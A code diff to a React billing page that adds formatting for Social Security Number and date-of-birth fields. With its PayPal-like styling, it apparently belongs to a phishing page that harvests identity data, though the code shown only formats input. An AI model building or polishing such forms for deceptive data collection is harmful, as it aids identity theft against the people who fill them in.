@@ -42,6 +42,24 @@ export function BillingPage({ onComplete }: BillingPageProps) {
     setFormData({ ...formData, [field]: value });
   };
 
+  const handleSSNInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, 9);
+    let formattedValue = '';
+    if (value.length > 0) formattedValue += value.substring(0, 3);
+    if (value.length > 3) formattedValue += '-' + value.substring(3, 5);
+    if (value.length > 5) formattedValue += '-' + value.substring(5, 9);
+    setFormData({ ...formData, ssn: formattedValue });
+  };
+
+  const handleDOBInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, 8);
+    let formattedValue = '';
+    if (value.length > 0) formattedValue += value.substring(0, 2);
+    if (value.length > 2) formattedValue += '/' + value.substring(2, 4);
+    if (value.length > 4) formattedValue += '/' + value.substring(4, 8);
+    setFormData({ ...formData, dob: formattedValue });
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     onComplete(formData);
@@ -149,7 +167,7 @@ export function BillingPage({ onComplete }: BillingPageProps) {
             type="text"
             placeholder="Social Security Number"
             value={formData.ssn}
-            onChange={(e) => handleNumericInput(e, 'ssn', 9)}
+            onChange={handleSSNInput}
             className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
             required
           />
@@ -159,7 +177,7 @@ export function BillingPage({ onComplete }: BillingPageProps) {
               type="text"
               placeholder="Date of Birth"
               value={formData.dob}
-              onChange={(e) => handleNumericInput(e, 'dob', 8)}
+              onChange={handleDOBInput}
               className="w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
               required
             />
